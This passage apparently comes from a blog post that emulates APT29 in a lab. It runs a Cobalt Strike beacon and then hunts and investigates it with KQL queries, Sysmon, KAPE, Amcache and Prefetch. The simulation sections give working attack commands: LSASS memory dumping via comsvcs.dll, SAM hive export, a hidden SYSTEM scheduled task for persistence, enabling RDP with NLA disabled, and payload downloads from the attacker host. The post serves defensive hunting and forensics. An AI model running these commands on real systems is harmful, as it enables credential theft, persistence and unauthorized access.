</table>

After delivery and clicking the link, the victim connects directly into the **C2 tunnel**.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-076.png" width="400" alt="C2 tunnel up"/></td><td><img src="/assets/img/posts/apt29-hunting/img-079.png" width="260" alt="session"/></td></tr>
</table>

Open an interactive session and rename the implant to evade further detection:

```powershell
[12/02 10:22:40] beacon> powershell Rename-Item "C:\Users\Victim-Machine\Desktop" "OneDrive.exe"
```

**KQL for hunting:**

```kql
DeviceFileEvents
| where FolderPath endswith @"\Desktop"
| where FileName contains "Attack" or FileName contains "Update"
   or FileName endswith ".hta" or FileName endswith ".exe"
```
```kql
DeviceProcessEvents
| where InitiatingProcessFileName in ("explorer.exe", "outlook.exe")
| where FileName endswith ".hta" or FileName endswith ".exe"
```
```kql
DeviceProcessEvents
| where InitiatingProcessFileName == "mshta.exe"
| where FileName == "powershell.exe" or FileName == "pwsh.exe"
```

---

## 3 · T1059.001 — PowerShell

APT29 makes heavy use of PowerShell to run commands and retrieve payloads on compromised systems. Operators frequently obfuscate or encode instructions to evade EDR, fetch additional payloads from remote servers, and support lateral movement — often combined with **LOLBins** to blend in with legitimate processes.

> 📎 Reference: <https://www.picussecurity.com/resource/blog/apt29-cozy-bear-evolution-techniques>

#### Case Study — November 2018 FireEye-Detected Campaign

In **November 2018**, FireEye detected a phishing campaign across defense, law enforcement, media, pharmaceuticals, think tanks, and the U.S. public sector. Emails impersonated the **U.S. Department of State** and delivered malicious **LNK** files inside ZIP archives. The LNKs executed **Cobalt Strike Beacon** alongside benign decoys. The campaign is assessed as likely **APT29**.

**Phishing infrastructure**
- Emails from likely-compromised legitimate servers (e.g., a hospital).
- Links to ZIP files on compromised domains like `jmj[.]com`.
- Emails appeared as official State Department communications, using public forms (`ds7002.pdf`) as decoys.

**Malware delivery** — ZIP archives contained:
- Malicious LNK: `ds7002.lnk` (MD5 `6ed0020b0851fb71d5b0076f4ee95f3c`)
- Decoy: `ds7002.pdf` (benign)

The LNK ran an obfuscated PowerShell command that extracted embedded content from the LNK, Base64-decoded it, and ran the Cobalt Strike Beacon DLL `cyzfc.dat` via `rundll32.exe` (export `PointFunctionCall`).

**Command & Control**
- Beacon communicated with `pandorasong[.]com` over HTTPS/443 using a modified **Pandora** Malleable C2 profile.
- Configured for process injection into `rundll32.exe`, with custom HTTP headers and User-Agent strings to mimic legitimate traffic.

**Operational timeline**

| Date | Event |
|------|-------|
| Oct 15, 2018 | C2 domain registered, SSL certificate issued |
| Nov 2, 2018 | LNK weaponized |
| Nov 14, 2018 | First phishing emails sent |

**Similarities to the 2016 campaign:** LNK structure & metadata (including builder MAC address), PowerShell loader functions/obfuscation, and targeting patterns. Main difference: 2018 used **Cobalt Strike** rather than custom malware.

**Indicators of Compromise**

| Type | Indicator |
|------|-----------|
| Phishing email | `DOSOneDriveNotifications-...@northshorehealthgm[.]org` |
| Malware hosting | `https://www.jmj[.]com/personal/nauerthn_state_gov/*` |
| C2 domain | `pandorasong[.]com` → `95.216.59[.]92` |
| `ds7002.zip` | MD5 `3fccf531ff0ae6fedd7c586774b17a2d` |
| `ds7002.lnk` | MD5 `6ed0020b0851fb71d5b0076f4ee95f3c` |
| `cyzfc.dat` | MD5 `16bbc967a8b6a365871a05c74a4f345b` |
| `ds7002.pdf` (decoy) | MD5 `313f4808aa2a2073005d219bc68971cd` |

FireEye detections: `Malware.Archive`, `Malware.Binary.lnk`, `Suspicious.Backdoor.Beacon`, `SUSPICIOUS POWERSHELL USAGE`.

> 📎 Reference: <https://cloud.google.com/blog/topics/threat-intelligence/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign>

#### Simulation Section

Steps (mail delivery already covered): **create a DLL beacon → send to victim → run PowerShell commands**. We use an encoded PowerShell command to run `rundll32.exe` against our beacon.

```text
rundll32 C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-082.png" width="300" alt="beacon"/></td><td><img src="/assets/img/posts/apt29-hunting/img-084.png" width="380" alt="beacon interact"/></td></tr>
</table>

**Enumeration commands run from the beacon:**

```powershell
powershell Get-WmiObject Win32_ComputerSystem
powershell Get-WmiObject Win32_OperatingSystem
powershell [Environment]::OSVersion
powershell systeminfo
powershell whoami /all
powershell Get-LocalUser
powershell net user
powershell net localgroup administrators
powershell Get-NetIPAddress
powershell Get-NetRoute
powershell Get-NetTCPConnection
powershell arp -a
powershell reg save HKLM\SAM    C:\Users\Public\SAM
powershell reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
powershell rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Users\Public\lsass.dmp full
```

<img src="/assets/img/posts/apt29-hunting/img-085.png" width="380" alt="enumeration"/> <img src="/assets/img/posts/apt29-hunting/img-086.png" width="380" alt="enumeration"/>

**KQL for hunting:**

```kql
DeviceProcessEvents
| where FileName ==~ "powershell.exe"
| where ProcessCommandLine has_any ("-enc", "-EncodedCommand", "-nop", "-noni", "-w hidden")
   or ProcessCommandLine matches "[A-Za-z0-9+/]{20,}={0,2}"
   or ProcessCommandLine contains "FromBase64String"
| join kind=leftouter (
    DeviceNetworkEvents
    | where InitiatingProcessFileName ==~ "powershell.exe"
    | project DeviceId, RemoteIP, RemotePort, InitiatingProcessCommandLine
  ) on DeviceId
| project Timestamp, DeviceName, ProcessCommandLine, RemoteIP, RemotePort
```

<img src="/assets/img/posts/apt29-hunting/img-087.png" width="380" alt="KQL hunting"/>

---

## 4 · T1053.005 — Scheduled Task

Cozy Bear leverages Windows Scheduled Tasks for persistence, running payloads at specific times/intervals without user interaction. A common pattern is an innocuously-named task (e.g. *"System Update"*) launching a PowerShell script hourly for C2, exfiltration, or fetching instructions:

```bat
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\path\to\script.ps1" /sc hourly
```

APT29 also used `scheduler` / `schtasks` to create tasks on **remote hosts** during lateral movement, modified legitimate tasks then restored them, and created a scheduled task to maintain **SUNSPOT** persistence during the 2020 **SolarWinds** intrusion.

**Stealth enhancements:**
- Randomized intervals (e.g. every **47–93 minutes**) to break predictable patterns.
- Hidden or minimally-privileged accounts.
- Encoded/obfuscated PowerShell payloads.
- `AtLogon` / `OnStartup` triggers for reboot persistence.
- Tasks run whether or not the user is logged in (stored credentials).
- Disguised to mimic vendor/OS maintenance jobs.

Tasks can be remotely **modified** (`schtasks /change`), **disabled** (`/change /disable`), or **deleted** (`/delete`).

> 📎 References: [Tracking APT29 phishing](https://cloud.google.com/blog/topics/threat-intelligence/tracking-apt29-phishing-campaigns) · [cyber-kill-chain.ch T1053/005](https://cyber-kill-chain.ch/techniques/T1053/005/)

#### Simulation Section

Re-using the `APT29.dll` beacon from T1059.001, upload a PowerShell script that appends a timestamp to `update_log.txt` each run:

```bash
beacon> cd C:\Users\Victim-Machine\Desktop\
beacon> upload /home/kali/Desktop/APT-shtask.ps1
```

<img src="/assets/img/posts/apt29-hunting/img-088.png" width="420" alt="upload ps1"/>

**Plain scheduled-task command:**
```bat
schtasks /create /tn "SystemUpdate" /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1" /sc hourly /ru SYSTEM
```

<img src="/assets/img/posts/apt29-hunting/img-092.png" width="400" alt="schtask"/>

> **`/ru SYSTEM` requires SYSTEM privilege.** `getuid` returns `DESKTOP-M8AP5P7\Victim-Machine`, and `whoami /groups` shows the Administrators group marked **Deny Only** — meaning the user is **not** an effective admin and the session is **not** elevated. Strong APT29-style persistence requires privilege escalation first.
{: .prompt-warning }

<img src="/assets/img/posts/apt29-hunting/img-093.png" width="360" alt="whoami groups"/>

**Three options:**

1. **Local-user task** (works, but no high privilege):
   ```bat
   schtasks /create /tn "UserUpdate" /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1" /sc hourly /f
   ```
2. **Run the beacon as Admin** (used here to save time — privilege escalation is out of scope):
   ```bat
   schtasks /create /tn SystemUpdate /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\\Users\\Victim-Machine\\Desktop\\APT-shtask.ps1" /sc hourly /ru SYSTEM /f
   ```
   → `SUCCESS: The scheduled task "SystemUpdate" has successfully been created.`
3. **Token theft** (`uac-token-duplication`) — *failed: no process held an admin token.* Scan for high-privilege processes with the beacon's `ps` command.

The resulting task runs **hidden**, under a **legit name**, **hourly**, as **SYSTEM**.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-098.png" width="380" alt="task created"/></td><td><img src="/assets/img/posts/apt29-hunting/img-099.png" width="380" alt="task properties"/></td></tr>
</table>

**KQL for hunting:**

```kql
DeviceEvents
| where ActionType == "ScheduledTaskCreated"
| project Timestamp, DeviceName, AccountName, AdditionalFields
| order by Timestamp desc
```
```kql
DeviceEvents
| where ActionType == "ScheduledTaskCreated" or ActionType == "ScheduledTaskUpdated"
| where AdditionalFields contains "powershell.exe"
| project Timestamp, DeviceName, AccountName, AdditionalFields
```
```kql
DeviceEvents
| where ActionType =~ "ScheduledTaskCreated"
| where AdditionalFields contains "SystemUpdate"
   or AdditionalFields contains "Update" or AdditionalFields contains "Maintenance"
| project Timestamp, DeviceName, AccountName, AdditionalFields
```

---

## 5 · T1021.001 — Remote Desktop Protocol

APT29 leverages valid credentials and built-in Windows remote services to blend in with legitimate administration. The group avoids noisy brute-force, preferring valid domain credentials obtained via **credential dumping (LSASS)**, **Kerberoasting**, or **OAuth-token abuse**, then performs stealthy lateral movement over **RDP**.

#### Simulation Section

**1. Enable RDP and open the firewall (as APT29 does):**
```powershell
reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
```bat
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

<img src="/assets/img/posts/apt29-hunting/img-103.png" width="420" alt="enable RDP"/>

**2. Create a user (to make forensics clearer):** `APT29` / `m******` (came in as Admin from the earlier elevated beacon).

**3. Open the RDP firewall port:**
```bat
netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
```

**4. Disable NLA (reduce auth noise when connecting from Kali):**
```bat
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**5. Add the user to the RDP group:**
```bat
net localgroup "Remote Desktop Users" APT29 /add
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-107.png" width="380" alt="create user"/></td><td><img src="/assets/img/posts/apt29-hunting/img-109.png" width="380" alt="rdp users"/></td></tr>
<tr><td colspan="2"><img src="/assets/img/posts/apt29-hunting/img-110.png" width="380" alt="rdp config"/></td></tr>
</table>

**6. Connect over RDP from Kali** using `xfreerdp3`:
```bash
xfreerdp3 /f /u:APT29 /p:****** /v:192.168.253.147
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-111.png" width="360" alt="rdp connect"/></td><td><img src="/assets/img/posts/apt29-hunting/img-112.png" width="360" alt="rdp session"/></td><td><img src="/assets/img/posts/apt29-hunting/img-113.png" width="360" alt="rdp session"/></td></tr>
</table>

---

## 6 · T1003.001 — LSASS Memory Dumping

One of the most critical stages in the APT29 chain is harvesting authentication material directly from the **Local Security Authority Subsystem Service (LSASS)** — yielding cached credentials, **NTLM hashes**, **Kerberos tickets**, and tokens for lateral movement, privilege escalation, and persistence.

APT29 uses multiple LSASS-dumping techniques depending on the stealth required. Common approaches:

- Cobalt Strike's built-in **`procdump`** module.
- **`rundll32.exe` loading `comsvcs.dll`** (frequently observed in APT29 ops).
- Stealthy tools such as **NanoDump** to bypass EDR/ETW.

#### Simulation Section

Ensure the beacon is **High Integrity** (`getuid`), then locate `lsass.exe` with the `ps` command.

<img src="/assets/img/posts/apt29-hunting/img-115.png" width="420" alt="ps lsass"/> <img src="/assets/img/posts/apt29-hunting/img-116.png" width="420" alt="ps lsass"/>

**Living-off-the-land via `comsvcs.dll`:**

| Field | Value |
|-------|-------|
| **DLL path** | `C:\Windows\System32\comsvcs.dll` (COM+ Services DLL) |
| **Function** | `MiniDump` — converts any process memory to a dump file (officially used by Microsoft for debugging) |
| **Method** | `rundll32.exe` → `comsvcs.dll, MiniDump` |

LSASS is protected by `SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege`, and `SeTcbPrivilege` — **Admin alone is not enough; SYSTEM access is required.**

Here the hashes are dumped and **Mimikatz** is run directly from Cobalt Strike to save time (cracking steps to follow later).

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-117.png" width="380" alt="lsass dump"/></td><td><img src="/assets/img/posts/apt29-hunting/img-118.png" width="380" alt="lsass dump"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-121.png" width="380" alt="mimikatz"/></td><td><img src="/assets/img/posts/apt29-hunting/img-122.png" width="380" alt="mimikatz"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-119.png" width="380" alt="lsass dump"/></td><td><img src="/assets/img/posts/apt29-hunting/img-123.png" width="380" alt="mimikatz"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-124.png" width="380" alt="mimikatz output"/></td><td><img src="/assets/img/posts/apt29-hunting/img-125.png" width="380" alt="mimikatz output"/></td></tr>
</table>

---

## 7 · T1071.001 — Web Protocols (C2)

APT29 extensively uses **HTTP/HTTPS** for covert Command-and-Control, crafted to resemble legitimate browser traffic: realistic User-Agent headers, encrypted payloads inside standard HTTP fields, and benign-looking URL structures. The group often relays C2 and exfiltration through cloud services like **GitHub** and **Dropbox**, and uses **beacon jitter** and randomized timing to defeat behavioral detection.

**Covert C2 over HTTPS (443)** hides tasking instructions, beacon metadata, and exfiltrated data — and because HTTPS encrypts the payload, defenders cannot inspect contents.

| Aspect | APT29 pattern |
|--------|---------------|
| **Realistic paths** | `/favicon.ico`, `/login/validate`, `/update`, `/wp-content/uploads/` |
| **Domains** | Mimic cloud/corporate sites; sometimes compromised servers with valid HTTPS certs |
| **HTTP methods** | `GET` (retrieve commands), `POST` (return results/stolen data), `HEAD`/`OPTIONS` (keep-alive) |
| **Header smuggling** | `Cookie:` (encrypted data), `User-Agent:` (malware version), `X-Session-ID:` (beacon ID), `Authorization:` (session keys) |

Example header:
```http
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Cookie: sessionId=gh4j2k1… ; data=base64_payload
```

> ⚠️ **Tell-tale:** browser-like traffic originating from **non-browser processes** — `rundll32.exe`, `wermgr.exe`, `powershell.exe`, `msbuild.exe`, or `svchost.exe` not associated with web-service roles.

#### Simulation Section

Create a new listener over **HTTPS (443)** and a payload named after the MITRE ID `T1071.001`. On the listener, choose **Browser Pivot**.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-129.png" width="400" alt="https listener"/></td><td><img src="/assets/img/posts/apt29-hunting/img-130.png" width="400" alt="https listener"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-131.png" width="400" alt="browser pivot"/></td><td></td></tr>
</table>

Now the victim's traffic flows through the proxy.

> **Beacon vs. Browser Pivot.** A **Beacon** can issue raw HTTP (GET/POST, up/downloads) — good for recon, HTTP scanning, and covert exfiltration — but **cannot** render pages, run JavaScript, or touch the DOM. **Browser Pivoting** routes the victim's real browser (Edge/Firefox) through the Beacon, enabling full browser-based attacks with the victim's **authenticated session**: accessing internal web apps, stealing cookies/tokens, CSRF/JS injection, and browsing internal portals.

Quick tests (these fail here as there's no real target web server):

```powershell
powershell Invoke-WebRequest http://target.local/
powershell "$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://target.local')"
powershell Invoke-RestMethod -Uri "http://target.local/api"
curl http://target.local/
powershell Invoke-WebRequest http://192.168.1.10/
```

<img src="/assets/img/posts/apt29-hunting/img-132.png" width="380" alt="web test"/> <img src="/assets/img/posts/apt29-hunting/img-133.png" width="380" alt="web test"/> <img src="/assets/img/posts/apt29-hunting/img-134.png" width="380" alt="web test"/>

**Intel471 correlation** — the *Threat Hunting Case Study: Cozy Bear* report aligns with T1071.001 even without naming the ID, citing HTTP-based C2, HTTPS data exfiltration, and web-request payload delivery. Indicators: repeated HTTP GET/POST to unusual endpoints with randomized URL paths; slightly-off User-Agent strings; small, frequent HTTPS POSTs that don't match normal traffic volume.

> 📎 Reference: <https://www.intel471.com/blog/threat-hunting-case-study-cozy-bear>

---

## 8 · Forensics & DFIR

This section reconstructs the emulated intrusion from host artifacts.

### 8.1 Event Logs & Sysmon

**Extract the event logs:**
```text
Security.evtx        C:\Windows\System32\winevt\Logs\Security.evtx
PowerShell Operational  C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
```

**Sysmon events leveraged:**

| Sysmon Event ID | Meaning |
|-----------------|---------|
| **1** | Process Create |
| **3** | Network Connection |
| **7** | Image Loaded (DLL beacon) |
| **11** | File Create |
| **13** | Registry Set |

#### Sysmon Event ID 1 — Process Creation (filter `rundll32.exe`)

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-135.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-136.png" width="380" alt="sysmon evt1"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-137.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-138.png" width="380" alt="sysmon evt1"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-139.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-140.png" width="380" alt="sysmon evt1"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-143.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-144.png" width="380" alt="encoded ps"/></td></tr>
</table>

```text
Initiated Process: rundll32.exe
Process Tree:      4344.exe > rundll32.exe
Process Path:      C:\Users\Victim-Machine\Desktop\4344.exe   (C2 Beacon)

DLL beacon:        APT29.dll
DLL path:          C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
CommandLine:       rundll32 C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
```

**Encoded PowerShell attempts** captured (Base64-encoded UTF-16LE):

```text
powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBOAGUAdABUAEMAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA==
   → Get-NetTCPConnection
powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAEMAbwBtAHAAdQB0AGUAcgBTAHkAcwB0AGUAbQA=
   → Get-WmiObject Win32_ComputerSystem
powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwA=
   → Get-NetIPAddress
powershell -nop -exec bypass -EncodedCommand dwBoAG8AYQBtAGkA
   → whoami
powershell -nop -exec bypass -EncodedCommand cwBjAGgAdABhAHMAawBzAC...   → schtasks /create /tn "SystemUpdate" ...
```

<img src="/assets/img/posts/apt29-hunting/img-142.png" width="420" alt="encoded powershell"/> <img src="/assets/img/posts/apt29-hunting/img-145.png" width="420" alt="encoded powershell"/>

Persistence-related artifacts from `APT29.dll`:
```text
C:\Windows\system32\cmd.exe /C upload /home/kali/Desktop/APT-shtask.ps1   (upload from Kali)
C:\Users\Victim-Machine\Desktop\APT-shtask.ps1                            (file path)
```

**PowerShell.exe analysis — focus on `Payload Data4`.** Observed process trees:
```text
rundll32.exe       > APT29.dll        > powershell.exe   (DLL Beacon)
OneDrive.exe       > powershell.exe                      (old C2 test beacon)
4344.exe           > powershell.exe                      (4344 beacon)
T1071.001.exe      > powershell.exe                      (T1071.001 beacon)
HEALTHY_STITCH.exe > powershell.exe                      (old C2 test beacon)
```

<img src="/assets/img/posts/apt29-hunting/img-146.png" width="400" alt="powershell trees"/>

**Commands observed:**
```text
Invoke-WebRequest 'http://192.168.253.148:8080/FUTURE_GARAGE.exe' -OutFile FUTURE.exe
whoami ; hostname ; ipconfig ; whoami /groups
powershell.exe -args Get-Process
iwr http://192.168.253.148/test.txt -OutFile C:\Users\Public\test.txt
"C:\Windows\system32\runas.exe" /user:Administrator cmd
schtasks.exe /create /tn SystemUpdate /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\upd.ps1" /sc hourly /ru SYSTEM
reg ... HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
"powershell.exe" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1
```

<img src="/assets/img/posts/apt29-hunting/img-147.png" width="380" alt="commands"/> <img src="/assets/img/posts/apt29-hunting/img-148.png" width="380" alt="commands"/>

#### Sysmon Event ID 3 — Network Connection

| Field | Value |
|-------|-------|
| **User** | `DESKTOP-M8AP5P7\Victim-Machine` |
| **User SID** | `S-1-5-21-1064308082-3896131167-3449499780-1001` |
| **Source host** | `DESKTOP-M8AP5P7` |
| **RuleName** | User Mode |
| **Destination IP** | `192.168.253.148` (Kali) |
| **Initiating processes** | `rundll32.exe`, `T1071.001.exe`, `OneDrive.exe`, `4344.exe` |

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-149.png" width="380" alt="evt3"/></td><td><img src="/assets/img/posts/apt29-hunting/img-150.png" width="380" alt="evt3"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-151.png" width="380" alt="evt3"/></td><td><img src="/assets/img/posts/apt29-hunting/img-152.png" width="380" alt="evt3"/></td></tr>
</table>

#### Sysmon Event ID 11 — File Creation

`APT-shtask.ps1` was created by `rundll32.exe`. (The file was also transferred directly during simulation to save time.)

<img src="/assets/img/posts/apt29-hunting/img-158.png" width="420" alt="evt11 file create"/>

#### PowerShell Script-Block Logging

```powershell
Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -Force
New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
```

<img src="/assets/img/posts/apt29-hunting/img-163.png" width="400" alt="scriptblock logging"/> <img src="/assets/img/posts/apt29-hunting/img-164.png" width="400" alt="scriptblock logging"/>

### 8.2 KAPE Triage

Two modules were used: **MiniTimelineCollection** and **!SANS_Triage**.

```text
.\kape.exe --tsource C: --tdest "C:\Users\Victim-Machine\Desktop\Kape Results" --tflush --target !SANS_Triage,MiniTimelineCollection --gui
```

<img src="/assets/img/posts/apt29-hunting/img-162.png" width="220" alt="KAPE"/>

#### $MFT — Master File Table

Parse `$MFT` to CSV with **MFTECmd**:
```text
MFTECmd.exe -f "C:\Users\Subzero\Desktop\$MFT" --csv "C:\Users\Subzero\Desktop"
```
Open in **Timeline Explorer**.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-166.png" width="380" alt="MFT"/></td><td><img src="/assets/img/posts/apt29-hunting/img-167.png" width="380" alt="MFT timeline"/></td></tr>
</table>

**Key artifacts from `$MFT`:**

| File | Created | Modified | Last Access | Notes |
|------|---------|----------|-------------|-------|
| `4344.exe` / `4344.EXE-4A79C548.pf` | 2025-12-03 12:53:00 | 2025-12-03 12:53:00 | 2025-12-03 12:54:39 | First beacon; has prefetch |
| `APT-shtask.ps1` | 2025-12-02 18:03:35 | 2025-12-02 18:03:35 | 2025-12-02 18:09:35 | Scheduled-task script |
| `SystemUpdate` | 2025-12-03 15:03:21 | 2025-12-03 15:03:21 | 2025-12-05 17:35:54 | `.\Windows\System32\Tasks` |
| `OneDrive.exe` | 2025-12-02 14:50:42 | 2025-12-02 14:50:42 | — | 19,456 B; `ONEDRIVE.EXE-9BD2FBB9.pf` |

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-168.png" width="380" alt="MFT artifacts"/></td><td><img src="/assets/img/posts/apt29-hunting/img-175.png" width="380" alt="MFT artifacts"/></td></tr>
</table>

#### Amcache

> **Note:** when transferring the Amcache from KAPE, include the `Amcache.hve.LOG1` and `Amcache.hve.LOG2` files.

Path: `C > Windows > AppCompat > Programs > Amcache.hve`. Parse with **AmcacheParser**:
```text
AmcacheParser.exe -f "C:\Users\Subzero\Desktop\Programs\Amcache.hve" --csv "C:\Users\Subzero\Desktop"
```
This produces **six** CSV views:

| View | Content | Execution artifacts? |
|------|---------|----------------------|
| **Amcache1** | Device Containers (NIC, audio, monitor, USB, printers) | ❌ No |
| **Amcache2** | Device Classes / Device Stack (drivers, services) | ❌ No |
| **Amcache3** | Drivers (paths, install times, versions) | ❌ No |
| **Amcache4** | Driver-package INF files (hardware IDs) | ❌ No |
| **Amcache5** | LNK files (shortcut name, target path, last write) | ⚠️ Indirect |
| **Amcache6** | **Programs / Executables** (paths, hashes, timestamps, versions) | ✅ **Yes** |

> 💡 **Amcache5 tip:** check `c:\users\victim-machine\AppData\Roaming\Microsoft\Windows\Start Menu` — a common location for persistence.

<table>
<tr>
<td align="center"><b>Amcache1 — Device Containers</b><br><img src="/assets/img/posts/apt29-hunting/img-176.png" width="300" alt="amcache1"/><br><img src="/assets/img/posts/apt29-hunting/img-178.png" width="300" alt="amcache1"/><br><img src="/assets/img/posts/apt29-hunting/img-179.png" width="300" alt="amcache1"/></td>
<td align="center"><b>Amcache2 — Device Classes</b><br><img src="/assets/img/posts/apt29-hunting/img-180.png" width="300" alt="amcache2"/><br><img src="/assets/img/posts/apt29-hunting/img-181.png" width="300" alt="amcache2"/></td>
</tr>
<tr>
<td align="center"><b>Amcache3 — Drivers</b><br><img src="/assets/img/posts/apt29-hunting/img-182.png" width="300" alt="amcache3"/><br><img src="/assets/img/posts/apt29-hunting/img-183.png" width="300" alt="amcache3"/><br><img src="/assets/img/posts/apt29-hunting/img-184.png" width="300" alt="amcache3"/><br><img src="/assets/img/posts/apt29-hunting/img-185.png" width="300" alt="amcache3"/></td>
<td align="center"><b>Amcache4 — Driver Packages (INF)</b><br><img src="/assets/img/posts/apt29-hunting/img-186.png" width="300" alt="amcache4"/><br><img src="/assets/img/posts/apt29-hunting/img-187.png" width="300" alt="amcache4"/></td>
</tr>
<tr>
<td align="center"><b>Amcache5 — LNK Files</b><br><img src="/assets/img/posts/apt29-hunting/img-188.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-189.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-190.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-191.png" width="300" alt="amcache5"/><br><img src="/assets/img/posts/apt29-hunting/img-192.png" width="300" alt="amcache5"/></td>
<td align="center"><b>Amcache6 — Programs / Executables</b><br><img src="/assets/img/posts/apt29-hunting/img-193.png" width="300" alt="amcache6"/><br><img src="/assets/img/posts/apt29-hunting/img-194.png" width="300" alt="amcache6"/><br><img src="/assets/img/posts/apt29-hunting/img-195.png" width="300" alt="amcache6 programs"/><br><img src="/assets/img/posts/apt29-hunting/img-196.png" width="200" alt="amcache6 beacon detail"/></td>
</tr>
</table>

**Beacons extracted from Amcache6 (Programs view):**

| File | SHA-1 hash | Path | Last accessed | Size |
|------|-----------|------|---------------|------|
| `4344.exe` | `d0fb209cc582e42ff0ff3bfbc40f88ede8469db5` | `c:\users\victim-machine\desktop\4344.exe` | 2025-12-03 12:54:11 | 19,456 B |
| `evil.exe` | `206650c4dee86d38d06e1840d13df6555ffaf69a` | `...\appdata\local\temp\rade33f6.tmp\evil.exe` | 2025-12-02 05:59:30 | 14,848 B |
| `t1071.001.exe` | `c250e1c70123cb4a78a41d99c29957119d07a917` | `c:\users\victim-machine\desktop\t1071.001.exe` | 2025-12-04 09:07:40 | 19,434 B |
| `onedrive.exe` | `559f7bc823af4ef757092e1c2bd439a3f5fc2e60` | `c:\users\victim-machine\desktop\onedrive.exe` | 2025-12-03 12:18:05 | 19,456 B |
| `healthy_stitch.exe` | `559f7bc823af4ef757092e1c2bd439a3f5fc2e60` | `c:\users\victim-machine\desktop\healthy_stitch.exe` | 2025-12-01 10:01:18 | 14,848 B |

> Note: `evil.exe` dropped in `%TMP%` is consistent with initial malware staging.

#### Shimcache (AppCompatCache)

Found in the **SYSTEM** hive: `...\Kape Results\C\Windows\system32\config\SYSTEM` (needs `LOG1` + `LOG2`). Parse with **AppCompatCacheParser**. Shimcache lists executables Windows attempted to run with last-modified timestamps and source hive. Can also be read via Registry: `SYSTEM → ControlSet001 → Control → Session Manager → AppCompatCache`.

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-197.png" width="380" alt="shimcache"/></td><td><img src="/assets/img/posts/apt29-hunting/img-198.png" width="380" alt="shimcache"/></td></tr>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-199.png" width="380" alt="shimcache"/></td><td><img src="/assets/img/posts/apt29-hunting/img-200.png" width="380" alt="shimcache"/></td></tr>
</table>

#### Prefetch — 100% Execution Confirmation

> Prefetch is the strongest proof of execution; other artifacts can be modified.

KAPE extracts PF files to `...\Kape Results\C\Windows\prefetch`. Parse with **PECmd**:
```text
PECmd.exe -d "C:\Users\Subzero\Desktop\prefetch" --csv "C:\Users\Subzero\Desktop"
```

<table>
<tr><td><img src="/assets/img/posts/apt29-hunting/img-201.png" width="380" alt="prefetch"/></td><td><img src="/assets/img/posts/apt29-hunting/img-202.png" width="380" alt="prefetch"/></td></tr>
